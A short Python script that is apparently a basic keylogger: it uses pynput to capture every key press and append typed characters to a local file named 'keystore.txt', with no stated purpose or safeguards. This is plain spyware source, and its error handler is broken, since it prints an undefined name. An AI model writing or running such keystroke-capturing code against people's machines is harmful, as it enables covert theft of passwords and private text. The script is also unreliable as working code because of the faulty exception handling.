from pynput import keyboard
def keystoke(key):
    print(str(key))
    with open("keystore.txt","a") as logkey:
        try:
            char=key.char
            logkey.write(char)
        except:
            print(error)
        
if __name__=="__main__":
    listener=keyboard.Listener(on_press=keystoke)
    listener.start()
    input()
